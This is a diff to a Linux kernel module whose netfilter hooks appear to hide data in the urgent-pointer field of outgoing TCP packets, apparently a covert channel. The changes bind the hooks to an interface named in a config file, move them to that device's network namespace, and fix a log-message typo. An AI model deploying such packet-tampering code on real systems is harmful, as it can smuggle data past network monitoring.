@@ -53,6 +53,7 @@ static uint sendHook(void *priv, struct sk_buff *skb, const struct nf_hook_state
             /* if (!send_data(iph->daddr, &tcph->urg_ptr, sizeof(tcph->urg_ptr))) */
                 /* tcpCheckSum(skb, tcph, iph); */
             send_data(iph->daddr, &tcph->urg_ptr, sizeof(tcph->urg_ptr), tcph->seq);
+            /* tcpCheckSum(skb, tcph, iph); */
         }
     }
     return NF_ACCEPT;
@@ -105,6 +106,28 @@ static int Hook_Init(void)
 {
     int ret = 0;
     struct file *fp;
+    struct net_device *dev;
+    struct net *net;
+    char *fcont;
+    char inter[32];
+
+    if (!(fcont = get_file_content_ptr(CONFIGFILE)))
+        return -1;
+    sscanf(fcont, "%s", inter);
+    kfree(fcont);
+    /* printk(KERN_INFO "Interface: %s\n", inter); */
+    dev = dev_get_by_name(&init_net, inter);
+    if (IS_ERR(dev) || !dev)
+        return -1;
+    printk(KERN_INFO "Interface: %s\n", dev->name);
+
+    sendNfHook.dev = dev;
+    recvNfHook.dev = dev;
+    net = dev_net(dev);
+    dev_put(dev);
+    if (IS_ERR(net) || !net)
+        return -1;
+    /* printk(KERN_INFO "Net address: %p\n", net); */
 
     fp = filp_open(SHFILEPATH, O_DIRECTORY, S_IRUSR);
     if (IS_ERR(fp))
@@ -135,16 +158,16 @@ static int Hook_Init(void)
 
     /* return -1; */
 
-    printk(KERN_INFO "NET_HOOK STSRTED!\n");
+    printk(KERN_INFO "NET_HOOK STARTED!\n");
 
-    ret = nf_register_net_hook(&init_net, &sendNfHook);
+    ret = nf_register_net_hook(net, &sendNfHook);
     if (0 != ret)
     {
         printk(KERN_WARNING "nf_register_hook failed\n");
         return -1;
     }
 
-    ret = nf_register_net_hook(&init_net, &recvNfHook);
+    ret = nf_register_net_hook(net, &recvNfHook);
     if (0 != ret)
     {
         printk(KERN_WARNING "nf_register_hook failed\n");
